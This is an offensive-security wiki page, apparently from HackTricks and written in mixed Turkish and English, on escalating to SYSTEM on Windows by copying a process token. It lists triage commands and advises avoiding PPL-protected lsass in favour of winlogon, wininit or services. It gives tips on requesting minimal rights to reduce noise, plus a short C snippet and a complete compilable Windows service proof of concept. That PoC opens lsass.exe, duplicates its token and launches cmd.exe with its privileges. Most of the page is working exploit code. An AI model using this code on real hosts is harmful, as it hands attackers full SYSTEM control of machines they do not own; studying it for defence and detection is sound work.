# SeDebug + SeImpersonate - Copy Token

{{#include ../../banners/hacktricks-training.md}}

This page covers the **manual token-theft** varyantını; burada zaten **`SeDebugPrivilege`** ve **`SeImpersonatePrivilege`** ayrıcalıklarına sahip bir **High Integrity** context, uygun bir **SYSTEM** process'i açar, token'ını **duplicates** eder ve bu token ile yeni bir process **spawns** eder.

Privileged bir admin process'inden hızlıca bir `SYSTEM` shell'e ihtiyacınız varsa şunları da inceleyin:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

Bir process-handle path'ine sahip değilseniz ancak **`SeImpersonatePrivilege`** özelliğine sahipseniz, **named-pipe / Potato** route'u genellikle daha kolaydır:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Quick triage

Token-copy path'ini denemeden önce, mevcut process'in zaten kullanışlı bir context içinde olduğunu doğrulayın:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege"
```
Notlar:

- **`SeDebugPrivilege`**, DACL normalde erişiminizi engellese bile birçok **korumasız** SYSTEM sürecini açmanıza olanak tanır.
- **`SeImpersonatePrivilege`**, sonrasında **`CreateProcessWithTokenW`** kullanımını pratik hale getirir.
- Token kopyalama yolu yalnızca zayıf veya filtrelenmiş bir SYSTEM token sağlıyorsa, **farklı bir SYSTEM sürecinden** token çalın.

## Hedef süreci dikkatle seçin

Teknik genellikle **`lsass.exe`** üzerinde gösterilir, ancak modern Windows'ta bu çoğu zaman **yanlış hedeftir**:

- **LSA Protection / RunAsPPL** etkinse, **`lsass.exe`** korunur ve **`SeDebugPrivilege`** sahibi normal bir yönetici süreci bile onu açamaz.<sup>[[2]](#references)</sup>
- **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`** veya erken başlatılan bir **`svchost.exe`** örneği gibi **PPL olmayan SYSTEM süreçlerini** tercih edin.
- **Protected processes** ve **`System`** veya **`csrss.exe`** gibi bazı özel süreçler, bu teknik için gerçekçi user-mode hedefleri değildir.
- Token'ı duplicate etmeden önce hedef token'ın istediğiniz ayrıcalıklara gerçekten sahip olup olmadığını doğrulamak için elevated olarak çalışan **Process Hacker / Process Explorer** kullanın.

## Pratikte önemli API ayrıntıları

Birçok genel PoC **`PROCESS_ALL_ACCESS`** ve **`TOKEN_ALL_ACCESS`** ister, ancak bu gereğinden daha fazla gürültü oluşturur. Pratikte:

- Hedef süreci yalnızca ihtiyacınız olan haklarla açın (genellikle **`PROCESS_QUERY_INFORMATION`** veya **`PROCESS_QUERY_LIMITED_INFORMATION`**).
- Token'ı process creation için gereken haklarla açın: **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**.
- Bir **primary token** oluşturmak için **`DuplicateTokenEx(..., TokenPrimary, ...)`** kullanın; tek başına bir impersonation token yeni bir süreç oluşturmak için yeterli değildir.
- **`CreateProcessWithTokenW`** işlemi **`1314`** ile başarısız olursa **`CreateProcessAsUserW`** kullanın.
- Bir **service / Session 0** içinden başlatıyorsanız, **`CreateProcessWithTokenW`** child süreci **caller's session** içinde tutar. Görünür bir desktop shell istiyorsanız **`CreateProcessAsUserW`** kullanın ve token'ı istenen session'a taşıyın.<sup>[[1]](#references)</sup>

Minimal modern akış şu şekildedir:
```c
HANDLE hp = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
HANDLE hTok = NULL, hDup = NULL;
OpenProcessToken(hp, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &hTok);
DuplicateTokenEx(hTok, MAXIMUM_ALLOWED, NULL,
SecurityImpersonation, TokenPrimary, &hDup);
CreateProcessWithTokenW(hDup, LOGON_WITH_PROFILE,
L"C:\\Windows\\System32\\cmd.exe",
NULL, 0, NULL, NULL, &si, &pi);
```
## Tam service PoC

Aşağıdaki code, bir **SYSTEM olarak çalışan process** içindeki **`SeDebugPrivilege` ve `SeImpersonatePrivilege` yetkilerini** ve **token üzerindeki tüm yetkileri** kopyalamak için **exploits**. Bu durumda code, primitive'in çalıştığını doğrulamak üzere bir **Windows service binary** olarak derlenip kullanılabilir.<sup>[[3]](#references)</sup>

**Elevation'ın gerçekleştiği code'un ana kısmı**, **`Exploit`** function'ının içindedir. Bu function içinde **`lsass.exe`**'in arandığını, **token'ının kopyalandığını** ve son olarak bu token'ın, kopyalanan token'ın tüm yetkilerine sahip yeni bir **`cmd.exe`** başlatmak için kullanıldığını görebilirsiniz.

Modern host'larda genellikle **`lsass.exe`** yerine **`winlogon.exe`**, **`wininit.exe`** veya **`services.exe`** gibi başka bir **non-PPL SYSTEM process** kullanmak istersiniz.

SYSTEM olarak çalışan ve token yetkilerinin tümüne veya çoğuna sahip diğer process'ler şunlardır: **`services.exe`**, **`svchost.exe`** (ilk çalışanlardan bazıları), **`wininit.exe`**, **`csrss.exe`**... Genellikle **protected process** içinden token kopyalayamayacağınızı unutmayın.
```c
// From https://cboard.cprogramming.com/windows-programming/106768-running-my-program-service.html
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#pragma comment (lib, "advapi32")

TCHAR* serviceName = TEXT("TokenDanceSrv");
SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle = 0;
HANDLE stopServiceEvent = 0;

//This function will find the pid of a process by name
int FindTarget(const char *procname) {

HANDLE hProcSnap;
PROCESSENTRY32 pe32;
int pid = 0;

hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

pe32.dwSize = sizeof(PROCESSENTRY32);

if (!Process32First(hProcSnap, &pe32)) {
CloseHandle(hProcSnap);
return 0;
}

while (Process32Next(hProcSnap, &pe32)) {
if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
pid = pe32.th32ProcessID;
break;
}
}

CloseHandle(hProcSnap);

return pid;
}


int Exploit(void) {

HANDLE hSystemToken, hSystemProcess;
HANDLE dupSystemToken = NULL;
HANDLE hProcess, hThread;
STARTUPINFOA si;
PROCESS_INFORMATION pi;
int pid = 0;


ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));

// open high privileged process
if ( pid = FindTarget("lsass.exe") )
hSystemProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
else
return -1;

// extract high privileged token
if (!OpenProcessToken(hSystemProcess, TOKEN_ALL_ACCESS, &hSystemToken)) {
CloseHandle(hSystemProcess);
return -1;
}

// make a copy of a token
DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupSystemToken);

// and spawn a new process with higher privs
CreateProcessAsUserA(dupSystemToken, "C:\\windows\\system32\\cmd.exe",
NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

return 0;
}


void WINAPI ServiceControlHandler( DWORD controlCode ) {
switch ( controlCode ) {
case SERVICE_CONTROL_SHUTDOWN:
case SERVICE_CONTROL_STOP:
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

SetEvent( stopServiceEvent );
return;

case SERVICE_CONTROL_PAUSE:
break;

case SERVICE_CONTROL_CONTINUE:
break;

case SERVICE_CONTROL_INTERROGATE:
break;

default:
break;
}
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}

void WINAPI ServiceMain( DWORD argc, TCHAR* argv[] ) {
// initialise service status
serviceStatus.dwServiceType = SERVICE_WIN32;
serviceStatus.dwCurrentState = SERVICE_STOPPED;
serviceStatus.dwControlsAccepted = 0;
serviceStatus.dwWin32ExitCode = NO_ERROR;
serviceStatus.dwServiceSpecificExitCode = NO_ERROR;
serviceStatus.dwCheckPoint = 0;
serviceStatus.dwWaitHint = 0;

serviceStatusHandle = RegisterServiceCtrlHandler( serviceName, ServiceControlHandler );

if ( serviceStatusHandle ) {
// service is starting
serviceStatus.dwCurrentState = SERVICE_START_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do initialisation here
stopServiceEvent = CreateEvent( 0, FALSE, FALSE, 0 );

// running
serviceStatus.dwControlsAccepted |= (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_RUNNING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

Exploit();
WaitForSingleObject( stopServiceEvent, -1 );

// service was stopped
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do cleanup here
CloseHandle( stopServiceEvent );
stopServiceEvent = 0;

// service is now stopped
serviceStatus.dwControlsAccepted &= ~(SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_STOPPED;
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}
}


void InstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CREATE_SERVICE );

if ( serviceControlManager ) {
TCHAR path[ _MAX_PATH + 1 ];
if ( GetModuleFileName( 0, path, sizeof(path)/sizeof(path[0]) ) > 0 ) {
SC_HANDLE service = CreateService( serviceControlManager,
serviceName, serviceName,
SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, path,
0, 0, 0, 0, 0 );
if ( service )
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

void UninstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CONNECT );

if ( serviceControlManager ) {
SC_HANDLE service = OpenService( serviceControlManager,
serviceName, SERVICE_QUERY_STATUS | DELETE );
if ( service ) {
SERVICE_STATUS serviceStatus;
if ( QueryServiceStatus( service, &serviceStatus ) ) {
if ( serviceStatus.dwCurrentState == SERVICE_STOPPED )
DeleteService( service );
}
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

int _tmain( int argc, TCHAR* argv[] )
{
if ( argc > 1 && lstrcmpi( argv[1], TEXT("install") ) == 0 ) {
InstallService();
}
else if ( argc > 1 && lstrcmpi( argv[1], TEXT("uninstall") ) == 0 ) {
UninstallService();
}
else  {
SERVICE_TABLE_ENTRY serviceTable[] = {
{ serviceName, ServiceMain },
{ 0, 0 }
};

StartServiceCtrlDispatcher( serviceTable );
}

return 0;
}
```
## Referanslar

- [1] [CreateProcessWithTokenW işlevi (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [2] [Eklenen LSA protection'ı yapılandırma (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
- [3] [Programımı service olarak çalıştırma (cboard.cprogramming.com) – PoC tarafından kullanılan Windows service skeleton'ı](https://cboard.cprogramming.com/windows-programming/106768-running-my-program-service.html)

{{#include ../../banners/hacktricks-training.md}}
